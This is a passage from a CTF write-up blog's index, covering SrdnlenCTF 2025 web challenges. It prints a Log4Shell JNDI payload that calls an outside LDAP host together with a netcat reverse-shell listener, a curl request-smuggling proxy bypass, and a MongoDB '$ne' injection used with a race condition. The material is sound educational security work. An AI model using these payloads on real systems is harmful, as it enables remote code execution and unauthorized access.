created by the poc.py file, and finally, the last port is used to receive the reverse shell on netcat. So, we also open a netcat session: nc -lvnp 9001 And then, I start the exploit: python poc.py --userip ngrok_link --webport 8080 --lport 9001 Once that is done, all that’s left is to send the string to the server to insert it into the logs. This can be done by writing a Python script with a socket connection to the server: python exploit.py Of course, in the exploit, every time it is run, the new ldap forwarding link created with ngrok must be set. This allowed me to obtain a reverse shell, and by running cat flag.txt, I was able to retrieve the flag. 🛠️ Exploitation Process ","date":"05/02/2025","objectID":"/posts/2025/02/05/sparkling-sky/:6:2","tags":["⚠️ CVE-2021-44228 (Log4Shell)","📜 Log4j","⚠️ CVE","🌐 Web Security"],"title":"🌐 Sparkling Sky","uri":"/posts/2025/02/05/sparkling-sky/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"Approach I used the following exploit. I installed openjdk-11-jdk (which is also used in the challenge), then in poc.py I replaced all the relative paths to the JDK with the names of the binaries, which are now in the PATH. I ran python3 poc.py --userip \u003cip\u003e --webport 8080 --lport 9001, which starts the LDAP server on port 1389 and the HTTP server on port 8080. Then, in another terminal, I started a netcat listener on port 9001 (nc -lvnp 9001). I performed the port forwarding for the 3 ports and ran exploit.py. Another way to do this was directly via the DevTools, as we have direct access to the socket variable in DevTools. We can interact directly with the socket. To activate the anticheat, we can send two movements with a short interval, using very different coordinates: socket.emit(\"move_bird\", {\"user_id\": 1, \"x\": 0, \"y\": 0, \"angle\": \"${jndi:ldap://\u003cip\\\u003e:1389/a}\"}); setTimeout(() =\u003e { socket.emit(\"move_bird\", {\"user_id\": 1, \"x\": 142142352425524, \"y\": 4322525524, \"angle\": \"${jndi:ldap://\u003cip\\\u003e:1389/a}\"}) }, 2000);  Exploit  POC 🚩 Flag Capture Flag 🔧 Tools Used Tool Purpose Python Exploit Ngrok Port Forwarding 📈 Technical Deep Dive ","date":"05/02/2025","objectID":"/posts/2025/02/05/sparkling-sky/:7:0","tags":["⚠️ CVE-2021-44228 (Log4Shell)","📜 Log4j","⚠️ CVE","🌐 Web Security"],"title":"🌐 Sparkling Sky","uri":"/posts/2025/02/05/sparkling-sky/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"Vulnerability Details Type: RCE (CVE-2021-44228) CVSS Score: 10 ","date":"05/02/2025","objectID":"/posts/2025/02/05/sparkling-sky/:8:0","tags":["⚠️ CVE-2021-44228 (Log4Shell)","📜 Log4j","⚠️ CVE","🌐 Web Security"],"title":"🌐 Sparkling Sky","uri":"/posts/2025/02/05/sparkling-sky/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"Mitigation Strategies Update to the last version of log4j. 💡 Key Learnings ","date":"05/02/2025","objectID":"/posts/2025/02/05/sparkling-sky/:9:0","tags":["⚠️ CVE-2021-44228 (Log4Shell)","📜 Log4j","⚠️ CVE","🌐 Web Security"],"title":"🌐 Sparkling Sky","uri":"/posts/2025/02/05/sparkling-sky/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"New Knowledge I learned how to exploit the Log4j vulnerability through the PoC. ","date":"05/02/2025","objectID":"/posts/2025/02/05/sparkling-sky/:10:0","tags":["⚠️ CVE-2021-44228 (Log4Shell)","📜 Log4j","⚠️ CVE","🌐 Web Security"],"title":"🌐 Sparkling Sky","uri":"/posts/2025/02/05/sparkling-sky/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"Skills Improved Binary Exploitation Reverse Engineering Web Exploitation Cryptography Forensics OSINT Miscellaneous 📚 References \u0026 Resources ","date":"05/02/2025","objectID":"/posts/2025/02/05/sparkling-sky/:11:0","tags":["⚠️ CVE-2021-44228 (Log4Shell)","📜 Log4j","⚠️ CVE","🌐 Web Security"],"title":"🌐 Sparkling Sky","uri":"/posts/2025/02/05/sparkling-sky/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"Official Documentation Tool Docs Vulnerability Info ","date":"05/02/2025","objectID":"/posts/2025/02/05/sparkling-sky/:12:0","tags":["⚠️ CVE-2021-44228 (Log4Shell)","📜 Log4j","⚠️ CVE","🌐 Web Security"],"title":"🌐 Sparkling Sky","uri":"/posts/2025/02/05/sparkling-sky/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"Learning Resources https://sysdig.com/blog/exploit-detect-mitigate-log4j-cve/ https://systemoverlord.com/2022/06/20/bsidessf-2022-ctf-login4shell.html https://snyk.io/blog/fetch-the-flag-ctf-2022-writeup-logster/ https://www.youtube.com/watch?v=P8uOcQIE4Uk\u0026ab_channel=2bitSec https://unit42.paloaltonetworks.com/apache-log4j-vulnerability-cve-2021-44228/ 📊 Final Statistics Metric Value Notes Time to Solve 00:44 From start to flag Global Ranking (At the time of flag submission) 26/1577 Challenge ranking Points Earned 500 Team contribution Created: 19-01-2025 • Last Modified: 19-01-2025 Author: mH4ck3r0n3 • Team: Team Aetruria ","date":"05/02/2025","objectID":"/posts/2025/02/05/sparkling-sky/:13:0","tags":["⚠️ CVE-2021-44228 (Log4Shell)","📜 Log4j","⚠️ CVE","🌐 Web Security"],"title":"🌐 Sparkling Sky","uri":"/posts/2025/02/05/sparkling-sky/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"A detailed write-up of the Web challenge 'Average HTTP/3 Enjoyer' from SrdnlenCTF - 2025","date":"05/02/2025","objectID":"/posts/2025/02/05/average-http/3-enjoyer/","tags":["🚫 403 Bypass","🚫 Proxy Rule Bypass","🛡️ HAProxy","🌐 Web Security"],"title":"🌐 Average HTTP/3 Enjoyer","uri":"/posts/2025/02/05/average-http/3-enjoyer/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":" Challenge Presentation ","date":"05/02/2025","objectID":"/posts/2025/02/05/average-http/3-enjoyer/:0:0","tags":["🚫 403 Bypass","🚫 Proxy Rule Bypass","🛡️ HAProxy","🌐 Web Security"],"title":"🌐 Average HTTP/3 Enjoyer","uri":"/posts/2025/02/05/average-http/3-enjoyer/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"📊 Challenge Overview Category Details Additional Info 🏆 Event SrdlenCTF - 2025 Event Link 🔰 Category Web 🌐 💎 Points 405 Out of 500 total ⭐ Difficulty 🟡 Medium Personal Rating: 3/10 👤 Author pysu Profile 🎮 Solves (At the time of flag submission) 23 XX% solve rate 📅 Date 19-01-2025 SrdlenCTF - 2025 Day X 🦾 Solved By aquila2 Team: Team Aetruria ","date":"05/02/2025","objectID":"/posts/2025/02/05/average-http/3-enjoyer/:1:0","tags":["🚫 403 Bypass","🚫 Proxy Rule Bypass","🛡️ HAProxy","🌐 Web Security"],"title":"🌐 Average HTTP/3 Enjoyer","uri":"/posts/2025/02/05/average-http/3-enjoyer/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"📝 Challenge Information HTTP/3 is just the best version of HTTP, wait a few years, until setting up an HTTP/3 server will not be a pain, and you’ll see. I hid a secret on /flag, you can only get it if you become a real HTTP/3 enjoyer. NOTE: This challenge uses only HTTP/3, browsers are a bit hesitant in using it by default, so you’ll have to use explicit arguments to do so. In chrome you can do the following: chrome –enable-quic –origin-to-force-quic-on=enjoyer.challs.ctf.srdnlen.it ","date":"05/02/2025","objectID":"/posts/2025/02/05/average-http/3-enjoyer/:2:0","tags":["🚫 403 Bypass","🚫 Proxy Rule Bypass","🛡️ HAProxy","🌐 Web Security"],"title":"🌐 Average HTTP/3 Enjoyer","uri":"/posts/2025/02/05/average-http/3-enjoyer/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"🎯 Challenge Files \u0026 Infrastructure ","date":"05/02/2025","objectID":"/posts/2025/02/05/average-http/3-enjoyer/:3:0","tags":["🚫 403 Bypass","🚫 Proxy Rule Bypass","🛡️ HAProxy","🌐 Web Security"],"title":"🌐 Average HTTP/3 Enjoyer","uri":"/posts/2025/02/05/average-http/3-enjoyer/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"Provided Files Files:  Attached Files 🔍 Initial Analysis ","date":"05/02/2025","objectID":"/posts/2025/02/05/average-http/3-enjoyer/:3:1","tags":["🚫 403 Bypass","🚫 Proxy Rule Bypass","🛡️ HAProxy","🌐 Web Security"],"title":"🌐 Average HTTP/3 Enjoyer","uri":"/posts/2025/02/05/average-http/3-enjoyer/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"First Steps After an initial analysis and some research, I tried making a request with curl using the --http3 option: curl --http3 https://enjoyer.challs.ctf.srdnlen.it Since the site was not reachable without HTTP/3 support, I proceeded to access the /flag route using curl: curl --http3 https://enjoyer.challs.ctf.srdnlen.it/flag Receiving a response with a 403 Unauthorized error: Forbidden Then I noticed that this was being blocked through the server’s proxy rules: acl restricted_flag path_sub,url_dec -m sub -i i /flag http-request deny if restricted_flag Through an HAProxy proxy. So I started doing some research online to find an effective bypass for this proxy rule. ","date":"05/02/2025","objectID":"/posts/2025/02/05/average-http/3-enjoyer/:4:0","tags":["🚫 403 Bypass","🚫 Proxy Rule Bypass","🛡️ HAProxy","🌐 Web Security"],"title":"🌐 Average HTTP/3 Enjoyer","uri":"/posts/2025/02/05/average-http/3-enjoyer/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"🔬 Vulnerability Analysis ","date":"05/02/2025","objectID":"/posts/2025/02/05/average-http/3-enjoyer/:5:0","tags":["🚫 403 Bypass","🚫 Proxy Rule Bypass","🛡️ HAProxy","🌐 Web Security"],"title":"🌐 Average HTTP/3 Enjoyer","uri":"/posts/2025/02/05/average-http/3-enjoyer/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"Potential Vulnerabilities 403 Bypass Proxy Rule Bypass 🎯 Solution Path ","date":"05/02/2025","objectID":"/posts/2025/02/05/average-http/3-enjoyer/:5:1","tags":["🚫 403 Bypass","🚫 Proxy Rule Bypass","🛡️ HAProxy","🌐 Web Security"],"title":"🌐 Average HTTP/3 Enjoyer","uri":"/posts/2025/02/05/average-http/3-enjoyer/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"Exploitation Steps ","date":"05/02/2025","objectID":"/posts/2025/02/05/average-http/3-enjoyer/:6:0","tags":["🚫 403 Bypass","🚫 Proxy Rule Bypass","🛡️ HAProxy","🌐 Web Security"],"title":"🌐 Average HTTP/3 Enjoyer","uri":"/posts/2025/02/05/average-http/3-enjoyer/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"Initial setup After searching online, as mentioned earlier, I found the page on StackOvreflow, from which I figured out how to craft the exploit. The trick was to URL-encode the slash (/) in a special syntax, but I also tried using the --path-as-is option in curl, but it didn’t work. After that, I needed to craft any header to bypass the rule. ","date":"05/02/2025","objectID":"/posts/2025/02/05/average-http/3-enjoyer/:6:1","tags":["🚫 403 Bypass","🚫 Proxy Rule Bypass","🛡️ HAProxy","🌐 Web Security"],"title":"🌐 Average HTTP/3 Enjoyer","uri":"/posts/2025/02/05/average-http/3-enjoyer/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"Exploitation With the following exploit, I was able to obtain the flag: echo \"\\n\"; curl --insecure -X \"$(echo -en 'GET %2fflag 1/\\r\\nX-Ignore-Injection:')\" https://enjoyer.challs.ctf.srdnlen.it --http3 ","date":"05/02/2025","objectID":"/posts/2025/02/05/average-http/3-enjoyer/:6:2","tags":["🚫 403 Bypass","🚫 Proxy Rule Bypass","🛡️ HAProxy","🌐 Web Security"],"title":"🌐 Average HTTP/3 Enjoyer","uri":"/posts/2025/02/05/average-http/3-enjoyer/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"Flag capture Manual Flag 🛠️ Exploitation Process ","date":"05/02/2025","objectID":"/posts/2025/02/05/average-http/3-enjoyer/:6:3","tags":["🚫 403 Bypass","🚫 Proxy Rule Bypass","🛡️ HAProxy","🌐 Web Security"],"title":"🌐 Average HTTP/3 Enjoyer","uri":"/posts/2025/02/05/average-http/3-enjoyer/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"Approach I wasn’t able to write the automatic exploit in Python due to issues with HTTP/3. I also tried using httpx, but it didn’t work. I even attempted using bash script, but without success.  None 🚩 Flag Capture Flag ","date":"05/02/2025","objectID":"/posts/2025/02/05/average-http/3-enjoyer/:7:0","tags":["🚫 403 Bypass","🚫 Proxy Rule Bypass","🛡️ HAProxy","🌐 Web Security"],"title":"🌐 Average HTTP/3 Enjoyer","uri":"/posts/2025/02/05/average-http/3-enjoyer/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"Proof of Execution Automated Flag Screenshot of successful exploitation 🔧 Tools Used Tool Purpose Curl Http3 request 💡 Key Learnings ","date":"05/02/2025","objectID":"/posts/2025/02/05/average-http/3-enjoyer/:8:0","tags":["🚫 403 Bypass","🚫 Proxy Rule Bypass","🛡️ HAProxy","🌐 Web Security"],"title":"🌐 Average HTTP/3 Enjoyer","uri":"/posts/2025/02/05/average-http/3-enjoyer/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"New Knowledge I learned about HTTP Request Smuggling and Header Smuggling from this challenge, but in the end, it was a bypass of the proxy rules through encoding with the addition of a crafted header field. ","date":"05/02/2025","objectID":"/posts/2025/02/05/average-http/3-enjoyer/:9:0","tags":["🚫 403 Bypass","🚫 Proxy Rule Bypass","🛡️ HAProxy","🌐 Web Security"],"title":"🌐 Average HTTP/3 Enjoyer","uri":"/posts/2025/02/05/average-http/3-enjoyer/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"Skills Improved Binary Exploitation Reverse Engineering Web Exploitation Cryptography Forensics OSINT Miscellaneous 📚 References \u0026 Resources ","date":"05/02/2025","objectID":"/posts/2025/02/05/average-http/3-enjoyer/:10:0","tags":["🚫 403 Bypass","🚫 Proxy Rule Bypass","🛡️ HAProxy","🌐 Web Security"],"title":"🌐 Average HTTP/3 Enjoyer","uri":"/posts/2025/02/05/average-http/3-enjoyer/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"Learning Resources https://hacktricks.boitatech.com.br/pentesting/pentesting-web/403-and-401-bypasses https://stackoverflow.com/questions/63689649/make-an-http-request-without-a-forward-slash/76882066#76882066 📊 Final Statistics Metric Value Notes Time to Solve 00:30 From start to flag Global Ranking (At the time of flag submission) 22/1572 Challenge ranking Points Earned 405 Team contribution Created: 19-01-2025 • Last Modified: 19-01-2025 Author: mH4ck3r0n3 • Team: Team Aetruria ","date":"05/02/2025","objectID":"/posts/2025/02/05/average-http/3-enjoyer/:11:0","tags":["🚫 403 Bypass","🚫 Proxy Rule Bypass","🛡️ HAProxy","🌐 Web Security"],"title":"🌐 Average HTTP/3 Enjoyer","uri":"/posts/2025/02/05/average-http/3-enjoyer/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"A detailed write-up of the Web challenge 'Focus. Speed. I Am Speed.' from SrdnlenCTF - 2025","date":"05/02/2025","objectID":"/posts/2025/02/05/focus.-speed.-i-am-speed./","tags":["💉 NoSQL Injection","⚡ Race Condition","🌐 Web Security"],"title":"🌐 Focus. Speed. I Am Speed.","uri":"/posts/2025/02/05/focus.-speed.-i-am-speed./"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":" Challenge Presentation 📊 Challenge Overview Category Details Additional Info 🏆 Event SrdlenCTF - 2025 Event Link 🔰 Category Web 🌐 💎 Points 50 Out of 500 total ⭐ Difficulty 🟢 Easy Personal Rating: 3/10 👤 Author Octaviusss Profile 🎮 Solves (At the time of flag submission) 189 XX% solve rate 📅 Date 19-01-2025 SrdlenCTF - 2025 Day X 🦾 Solved By aquila2 Team: Team Aetruria ","date":"05/02/2025","objectID":"/posts/2025/02/05/focus.-speed.-i-am-speed./:0:0","tags":["💉 NoSQL Injection","⚡ Race Condition","🌐 Web Security"],"title":"🌐 Focus. Speed. I Am Speed.","uri":"/posts/2025/02/05/focus.-speed.-i-am-speed./"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"📝 Challenge Information Welcome to Radiator Springs’ finest store, where every car enthusiast’s dream comes true! But remember, in the world of racing, precision matters—so tread carefully as you navigate this high-octane experience. Ka-chow! Website: http://speed.challs.srdnlen.it:8082 ","date":"05/02/2025","objectID":"/posts/2025/02/05/focus.-speed.-i-am-speed./:1:0","tags":["💉 NoSQL Injection","⚡ Race Condition","🌐 Web Security"],"title":"🌐 Focus. Speed. I Am Speed.","uri":"/posts/2025/02/05/focus.-speed.-i-am-speed./"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"🎯 Challenge Files \u0026 Infrastructure ","date":"05/02/2025","objectID":"/posts/2025/02/05/focus.-speed.-i-am-speed./:2:0","tags":["💉 NoSQL Injection","⚡ Race Condition","🌐 Web Security"],"title":"🌐 Focus. Speed. I Am Speed.","uri":"/posts/2025/02/05/focus.-speed.-i-am-speed./"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"Provided Files Files:  Attached Files 🔍 Initial Analysis ","date":"05/02/2025","objectID":"/posts/2025/02/05/focus.-speed.-i-am-speed./:2:1","tags":["💉 NoSQL Injection","⚡ Race Condition","🌐 Web Security"],"title":"🌐 Focus. Speed. I Am Speed.","uri":"/posts/2025/02/05/focus.-speed.-i-am-speed./"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"First Steps Initially, the website appears as follows: Site Presentation Home Page we notice by going to the Official Store that it is an online store. Official Store So, most likely, the intent of this challenge will be to purchase the flag. In fact, by opening the attached files, specifically app.js, we can notice these lines of code in the population of the database products: const products = [ { productId: 1, Name: \"Lightning McQueen Toy\", Description: \"Ka-chow! This toy goes as fast as Lightning himself.\", Cost: \"Free\" }, { productId: 2, Name: \"Mater's Tow Hook\", Description: \"Need a tow? Mater's here to save the day (with a little dirt on the side).\", Cost: \"1 Point\" }, { productId: 3, Name: \"Doc Hudson's Racing Tires\", Description: \"They're not just any tires, they're Doc Hudson's tires. Vintage!\", Cost: \"2 Points\" }, { productId: 4, Name: \"Lightning McQueen's Secret Text\", Description: \"Unlock Lightning's secret racing message! Only the fastest get to know the hidden code.\", Cost: \"50 Points\", FLAG: process.env.FLAG || 'SRDNLEN{fake_flag}' } ]; As we can see, in productId: 4 (the last and most expensive one, the flag is contained). Now we just need to figure out how to accumulate points. By continuing to analyze the attached files, we’ll realize that MongoDB is being used, and in app.py we will find a function that generates discount codes. const createDiscountCodes = async () =\u003e { const discountCodes = [ { discountCode: generateDiscountCode(), value: 20 } ]; for (const code of discountCodes) { const existingCode = await DiscountCodes.findOne({ discountCode: code.discountCode }); if (!existingCode) { await DiscountCodes.create(code); console.log(`Inserted discount code: ${code.discountCode}`); } else { console.log(`Discount code ${code.discountCode} already exists.`); } } }; This function generates 10 random discount codes for the purchase, which will be used to acquire points that can then be spent on purchasing items, via the /redeem route specified in the routes.py file. Here, there is a vulnerable part of the code, as it accepts a parameter discountCode, which can be used to redeem a valid code and acquire points. The vulnerability is found exactly in this portion of the code: const { discountCode } = req.query; if (!discountCode) { return res.render('error', { Authenticated: true, message: 'Discount code is required!' }); } const discount = await DiscountCodes.findOne({ discountCode }); In fact, since discountCode is a parameter that can be manipulated by the user and is directly used in the query as it is entered by the user, we can send a malicious payload using a NoSQL Injection to find a valid discount code. The query, as it is set, takes the discountCode and checks whether it matches one of those 10 randomly generated discount codes seen earlier. By sending a malicious payload, we can create a condition that returns True, allowing us to redeem a discount code even without knowing it. Later, there is a check where only one discount code can be redeemed per day. So, even if we try to redeem it, we would only get 20 of the 50 points needed. Continuing to read the code, to bypass this check, we can exploit another vulnerability. Usually, when a timeout or delay is applied, it is related to a Race Condition. As we can see in the following lines of code: // Apply the gift card value to the user's balance const { Balance } = await User.findById(req.user.userId).select('Balance'); user.Balance = Balance + discount.value; // Introduce a slight delay to ensure proper logging of the transaction // and prevent potential database write collisions in high-load scenarios. new Promise(resolve =\u003e setTimeout(resolve, delay * 1000)); user.lastVoucherRedemption = today; await user.save(); The account balance is extracted, then increased by adding the discount code that we have redeemed. A timeout is applied based on the delay variable declared at the beginning of the file (let delay = 1.5;), which is then multiplied by 1000 (to convert it to milliseconds). This results in a total timeout of 1.5 seconds before the balance update is actually performed in the database. We can exploit this time delay by sending, for example, two more requests in parallel to accumulate 60 points and purchase the flag. This is possible because the subsequent two requests will be sent in less than 1.5 seconds, and therefore, they will pass the checks done previously. These checks are based on the values present in the database, and since those values have not been updated yet due to the timeout, we can redeem multiple codes without being blocked by the restriction that allows redeeming only one code per day. By sending the requests during this window of time, we are able to bypass the restriction and accumulate enough points to purchase the flag. 🎯 Solution Path ","date":"05/02/2025","objectID":"/posts/2025/02/05/focus.-speed.-i-am-speed./:3:0","tags":["💉 NoSQL Injection","⚡ Race Condition","🌐 Web Security"],"title":"🌐 Focus. Speed. I Am Speed.","uri":"/posts/2025/02/05/focus.-speed.-i-am-speed./"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"Exploitation Steps ","date":"05/02/2025","objectID":"/posts/2025/02/05/focus.-speed.-i-am-speed./:4:0","tags":["💉 NoSQL Injection","⚡ Race Condition","🌐 Web Security"],"title":"🌐 Focus. Speed. I Am Speed.","uri":"/posts/2025/02/05/focus.-speed.-i-am-speed./"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"Initial setup After understanding the vulnerabilities we are dealing with, I did a couple of searches on the internet to exploit the NoSQL Injection, as for the Race Condition, it’s enough to create an exploit script in Python with multithreading to send multiple requests concurrently. Through PayloadAllTheThings, I searched for NoSQL payloads https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/NoSQL%20Injection/README.md. I tried the following payload: http://speed.challs.srdnlen.it:8082/redeem?discountCode[$ne]=test, where $ne stands for not equal. What could happen with this in the following portion of the code, which was also mentioned earlier? const existingCode = await DiscountCodes.findOne({ discountCode: code.discountCode }); As we mentioned, in this case, the above code will create a valid condition, so it’s as if we’ve found the correct discountCode. If we were to express this in natural language, the action would be find me a discountCode that is not equal to 'test'. As we saw during the generation phase, the discountCodes are totally random and alphanumeric, so it’s impossible for the database to have a discountCode equal to test. Therefore, the condition will return True, allowing us to redeem the code and add 20 points to our balance. ","date":"05/02/2025","objectID":"/posts/2025/02/05/focus.-speed.-i-am-speed./:4:1","tags":["💉 NoSQL Injection","⚡ Race Condition","🌐 Web Security"],"title":"🌐 Focus. Speed. I Am Speed.","uri":"/posts/2025/02/05/focus.-speed.-i-am-speed./"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"Exploitation The exploitation phase doesn’t stop here. Now that we’ve figured out how to redeem points, we need to understand how to redeem more than 20 points per day, as mentioned earlier. We can use Python's multithreading to take advantage of that one and a half seconds timeout set for making multiple requests. So, I’ll write a script that does this and retrieves the flag, because doing it manually would be impossible. ","date":"05/02/2025","objectID":"/posts/2025/02/05/focus.-speed.-i-am-speed./:4:2","tags":["💉 NoSQL Injection","⚡ Race Condition","🌐 Web Security"],"title":"🌐 Focus. Speed. I Am Speed.","uri":"/posts/2025/02/05/focus.-speed.-i-am-speed./"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"Flag capture Manual Flag 🛠️ Exploitation Process ","date":"05/02/2025","objectID":"/posts/2025/02/05/focus.-speed.-i-am-speed./:4:3","tags":["💉 NoSQL Injection","⚡ Race Condition","🌐 Web Security"],"title":"🌐 Focus. Speed. I Am Speed.","uri":"/posts/2025/02/05/focus.-speed.-i-am-speed./"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"Approach The Python exploit utilizes requests, bs4, and finally, multithreading to leverage the Race Condition. I create a pool of 20 threads that run concurrently after a registration phase and account creation using the Faker library, which generates random fake credentials. Once that’s done, I take advantage of the NoSQL Injection for all the threads by visiting the /redeem?discountCode[$ne]=test route, which will redeem a code and add a total of 20 points to the account balance each time, taking advantage of the one-and-a-half-second timeout. Once all of that is done, I visit the root (/) of the site where the flag is displayed (as shown in the image above), and then I extract it using BeautifulSoup and print it out.  Exploit 🚩 Flag Capture Flag ","date":"05/02/2025","objectID":"/posts/2025/02/05/focus.-speed.-i-am-speed./:5:0","tags":["💉 NoSQL Injection","⚡ Race Condition","🌐 Web Security"],"title":"🌐 Focus. Speed. I Am Speed.","uri":"/posts/2025/02/05/focus.-speed.-i-am-speed./"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"Proof of Execution Automated Flag Screenshot of successful exploitation 🔧 Tools Used Tool Purpose Python Exploit 💡 Key Learnings ","date":"05/02/2025","objectID":"/posts/2025/02/05/focus.-speed.-i-am-speed./:6:0","tags":["💉 NoSQL Injection","⚡ Race Condition","🌐 Web Security"],"title":"🌐 Focus. Speed. I Am Speed.","uri":"/posts/2025/02/05/focus.-speed.-i-am-speed./"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"New Knowledge I have learned NoSQL Injection operators such as $ne, $lt, and how to exploit them in an unsanitized query. I also learned how to create a race condition with multiple sessions to exploit even the milliseconds of delay. ","date":"05/02/2025","objectID":"/posts/2025/02/05/focus.-speed.-i-am-speed./:7:0","tags":["💉 NoSQL Injection","⚡ Race Condition","🌐 Web Security"],"title":"🌐 Focus. Speed. I Am Speed.","uri":"/posts/2025/02/05/focus.-speed.-i-am-speed./"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"Time Optimization Whenever a delay or any kind of lag is introduced in the code, always consider the possibility of a Race Condition. Additionally, where there are comments in the code, it’s as if there are hints pointing to where the vulnerability might be located. ","date":"05/02/2025","objectID":"/posts/2025/02/05/focus.-speed.-i-am-speed./:8:0","tags":["💉 NoSQL Injection","⚡ Race Condition","🌐 Web Security"],"title":"🌐 Focus. Speed. I Am Speed.","uri":"/posts/2025/02/05/focus.-speed.-i-am-speed./"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"Skills Improved Binary Exploitation Reverse Engineering Web Exploitation Cryptography Forensics OSINT Miscellaneous 📚 References \u0026 Resources ","date":"05/02/2025","objectID":"/posts/2025/02/05/focus.-speed.-i-am-speed./:9:0","tags":["💉 NoSQL Injection","⚡ Race Condition","🌐 Web Security"],"title":"🌐 Focus. Speed. I Am Speed.","uri":"/posts/2025/02/05/focus.-speed.-i-am-speed./"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"Learning Resources https://www.invicti.com/learn/nosql-injection/ https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/NoSQL%20Injection/README.md https://www.guidepointsecurity.com/blog/race-conditions-in-modern-web-applications/#:~:text=RACE%20conditions%20occur%20when%20we,RACE%20condition%20may%20be%20present. 📊 Final Statistics Metric Value Notes Time to Solve 00:15 From start to flag Global Ranking (At the time of flag submission) 26/1577 Challenge ranking Points Earned 500 Team contribution Created: 19-01-2025 • Last Modified: 19-01-2025 Author: mH4ck3r0n3 • Team: Team Aetruria ","date":"05/02/2025","objectID":"/posts/2025/02/05/focus.-speed.-i-am-speed./:10:0","tags":["💉 NoSQL Injection","⚡ Race Condition","🌐 Web Security"],"title":"🌐 Focus. Speed. I Am Speed.","uri":"/posts/2025/02/05/focus.-speed.-i-am-speed./"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"A detailed write-up of the Web challenge 'Ben 10' from SrdnlenCTF - 2025","date":"05/02/2025","objectID":"/posts/2025/02/05/ben-10/","tags":["🚫 Broken Access Control","🌐 Web Security"],"title":"🌐 Ben 10","uri":"/posts/2025/02/05/ben-10/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":" Challenge Presentation 📊 Challenge Overview Category Details Additional Info 🏆 Event SrdlenCTF - 2025 Event Link 🔰 Category Web 🌐 💎 Points 50 Out of 500 total ⭐ Difficulty 🟢 Easy Personal Rating: 3/10 👤 Author gheddus Profile 🎮 Solves (At the time of flag submission) 354 XX% solve rate 📅 Date 19-01-2025 SrdlenCTF - 2025 Day X 🦾 Solved By mH4ck3r0n3 Team: Team Aetruria ","date":"05/02/2025","objectID":"/posts/2025/02/05/ben-10/:0:0","tags":["🚫 Broken Access Control","🌐 Web Security"],"title":"🌐 Ben 10","uri":"/posts/2025/02/05/ben-10/"},{"categories":["Ethical Hacking/CTFs/Jeopardy/SrdnlenCTF-2025/Web"],"content":"📝 Challenge Information Ben Tennyson’s Omnitrix holds a mysterious and powerful form called Materia Grigia — a creature that only those with the sharpest minds can access. It’s hidden deep within the system, waiting for someone clever enough to unlock it. Only the smartest can access what’s truly hidden. Can you outsmart the system and reveal the flag? Website: http://ben10.challs.srdnlen.it:8080 